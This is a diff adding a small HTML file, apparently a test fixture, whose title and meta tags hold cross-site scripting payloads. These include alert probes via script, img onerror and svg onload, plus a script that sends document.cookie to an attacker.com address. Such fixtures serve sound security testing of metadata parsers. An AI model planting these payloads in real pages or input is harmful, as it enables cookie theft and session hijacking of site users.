@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title><script>alert('XSS')</script></title>
+    <meta property="og:title" content="<img src=x onerror='alert(document.cookie)'>">
+    <meta property="og:description" content="<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>">
+    <meta name="description" content="<svg onload='alert(1)'>">
+</head>
+<body></body>
+</html>
